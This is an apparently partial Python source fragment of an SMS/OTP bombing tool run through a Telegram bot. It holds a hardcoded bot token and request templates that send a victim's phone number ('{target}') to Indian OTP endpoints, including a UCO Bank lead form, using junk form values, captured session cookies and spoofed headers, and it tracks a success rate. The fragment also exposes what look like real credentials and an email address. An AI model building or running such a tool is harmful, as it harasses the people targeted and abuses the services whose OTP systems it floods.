...
BOT_TOKEN = os.environ.get("8526792242:AAHWUcIbXTr0tnVveVYrV8GZMgiv7Qj47ng")
if not BOT_TOKEN:
        ...
        "91": [
            ...
            },
            {
                ...
                "headers": {
                    ...
                    "Accept-Encoding": "gzip, deflate, br, zstd",
                    "User-Agent": "Mozilla/5.0 (Linux; Android 13; RMX3081 Build/RKQ1.211119.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/131.0.6778.135 Mobile Safari/537.36",
                    "Cookie": "_pk_id.1.e68e=1ddc9d91406c0a63.1733416698.; theme_option=dark_theme; user_sub_status=U2FsdGVkX1%2Bws%2Bg0YmKfdRAdqYdkkax%2FIcfgmnokzkE%3D"
                },
                "data": {
                    "mobile_no": "+91{target}"
                },
            ...
            },
            {
                ...
                "params": {
                    ...
                    "appRefNo": "",
                    "lgName": "fdgefgdgg",
                    "lgAddress": "dfgdsggfesdggg",
                    "lgPincode": "695656",
                    "lgState": "DL",
                    "lgDistrict": "NORTH DELHI",
                    "lgBranch": "0313",
                    "lgMobileno": "{target}",
                    "lgEmail": "sundeshaakshays@gmail.com",
                    "lgFacilities": "CC",
                    "lgTentAmt": "656556565",
                    "lgRemarks": "efwfwfsafw",
                    "declare_check": "on",
                    "captchaRefno": "315904",
                    "captchaResult": "71",
                    "firstName": "Gjgjgjgv",
                    "password": "ghfughdsy-5_33#",
                    "requestType": "SENDOTP",
                    "mobileNumber": "{target}",
                    "login": "gjghgug@gmail.com",
                    "genderType": "Male"
                },
                "headers": {
                    "Referer": "https://apps.ucoonline.in/Lead_App/lead_web.jsp",
                    "Cookie": "JSESSIONID=9AF635F323A70A62FDE04FB64FD56F78.apps1",
                    "Origin": "https://apps.ucoonline.in",
                    "Accept": "*/*",
                    "X-Requested-With": "XMLHttpRequest",
                    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
...
• Success Rate: {stats['total_success']/stats['total_requests']*100:.1f}% if {stats['total_requests'] > 0 else 0}
